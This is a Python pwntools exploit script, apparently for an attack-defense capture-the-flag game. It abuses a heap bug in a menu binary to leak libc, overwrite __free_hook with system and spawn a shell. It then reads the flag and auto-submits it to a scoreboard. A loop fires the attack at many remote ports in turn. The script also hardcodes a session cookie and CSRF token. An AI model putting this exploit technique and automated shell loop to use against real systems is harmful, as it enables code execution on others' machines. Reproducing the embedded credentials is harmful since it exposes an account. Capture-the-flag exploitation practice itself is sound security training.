import sys
from pwn import *
from ctypes import *
import requests
def submit_flag(id,flag):
    cookies = {
        'session': 'a925880c-63bf-447f-a25d-dd86bd8254c0',
    }

    headers = {
        'Proxy-Connection': 'keep-alive',
        'Accept': '*/*',
        'CSRF-Token': '50ac9ad4db0be0bac3f0b560c6a9ccfc2a7c84dac4e4a3e7cc005b0b917b952d',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
        'Content-Type': 'application/json',
        'Origin': 'http://39.100.119.37:8000',
        'Referer': 'http://39.100.119.37:8000/challenges',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6',
        'X-Requested-With': 'XMLHttpRequest',
    }

    data = '{"challenge_id":'+str(id)+',"submission":"'+flag+'"}'
    print(data)

    response = requests.post('http://39.100.119.37:8000/api/v1/challenges/attempt', headers=headers, cookies=cookies, data=data, verify=False)
    print(response.text)
# context.log_level='debug'
#context.arch='amd64'
ssss=0
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./pwn')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			if ssss==22:
				sleep(5*60)
				ssss=0
			port=40280+ssss*100
			while port ==40880 or port ==41680 or port ==41780 :
				port+=100
				ssss+=1
			io=remote('39.100.119.37',port)
			ssss+=1
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('your choise:','2')
			io.sendlineafter('Please input the weight of u spear:',str(a))
			io.sendafter('s description:',c)

		def delete(a):
			io.sendlineafter('your choise:','3')
			io.sendlineafter('Index:\n',str(a))

		def edit(a,b,c):
			io.sendlineafter('your choise:','4')
			io.sendlineafter('Please input the index:',str(a))
			io.sendlineafter('what size of your decoration?',str(b))
			io.sendafter('Please:',c)

		def show(a):
			io.sendlineafter('your choise:','5')
			io.sendlineafter('index:\n',str(a))
		


		add(0xf0,'aaaa')
		add(0x18,'aaaa')
		delete(0)
		add(0xf0,'a')
		show(0)
		io.recvuntil('is :')
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-0x51
		libc.address=libc_base
		delete(1)
		delete(0)
		add(0x18,p64(libc.sym['__free_hook']))
		edit(1,0x8,p64(libc.sym['system']))
		edit(0,0x8,'/bin/sh\x00')
		delete(0)
		sleep(0.5)
		io.sendline('cat flag')
		sleep(1)
		flag1=io.recv()
		aaa='flag{'
		if aaa in flag1 :
			print flag1
			submit_flag(4,flag1)


		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		# io.interactive()
		io.close()

	except Exception as e:
		io.close()
		continue
	